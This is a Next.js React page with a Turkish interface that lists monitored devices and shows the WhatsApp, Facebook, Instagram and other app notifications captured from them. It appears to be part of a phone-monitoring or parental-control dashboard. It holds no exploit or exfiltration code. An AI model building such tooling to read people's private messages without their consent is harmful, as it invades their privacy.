'use client';

import { useEffect, useState, Suspense } from 'react';
import { useSearchParams } from 'next/navigation';
import { api, NotificationItem, Device, formatDate } from '@/lib/api';

function NotificationsContent() {
  const searchParams = useSearchParams();
  const [devices, setDevices] = useState<Device[]>([]);
  const [selectedDevice, setSelectedDevice] = useState('');
  const [notifications, setNotifications] = useState<NotificationItem[]>([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    api.getDevices().then((d) => {
      setDevices(d);
      const fromUrl = searchParams.get('device');
      const id = fromUrl && d.find((x) => x.id === fromUrl) ? fromUrl : d[0]?.id || '';
      setSelectedDevice(id);
    });
  }, [searchParams]);

  useEffect(() => {
    if (!selectedDevice) { setLoading(false); return; }
    setLoading(true);
    api.getNotifications(selectedDevice).then(setNotifications).finally(() => setLoading(false));
  }, [selectedDevice]);

  return (
    <div>
      <h1 className="text-2xl font-bold mb-6">Sosyal Medya Bildirimleri</h1>
      <p className="text-sm text-gray-500 mb-4">WhatsApp, Facebook, Instagram ve diğer uygulama bildirimleri</p>
      {devices.length > 0 && (
        <select className="input mb-6 max-w-xs" value={selectedDevice} onChange={(e) => setSelectedDevice(e.target.value)}>
          {devices.map((d) => <option key={d.id} value={d.id}>{d.deviceName}</option>)}
        </select>
      )}
      {loading ? (
        <div className="animate-pulse text-gray-500">Yükleniyor...</div>
      ) : notifications.length === 0 ? (
        <div className="card text-gray-500">Bildirim kaydı yok</div>
      ) : (
        <div className="space-y-3">
          {notifications.map((n) => (
            <div key={n.id} className="card">
              <div className="flex justify-between mb-2">
                <span className="font-medium">{n.appName || n.appPackage}</span>
                <span className="text-xs text-gray-500">{formatDate(n.timestamp)}</span>
              </div>
              {n.title && <p className="font-medium text-sm">{n.title}</p>}
              {n.text && <p className="text-gray-700 mt-1">{n.text}</p>}
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

export default function NotificationsPage() {
  return (
    <Suspense fallback={<div className="animate-pulse text-gray-500">Yükleniyor...</div>}>
      <NotificationsContent />
    </Suspense>
  );
}
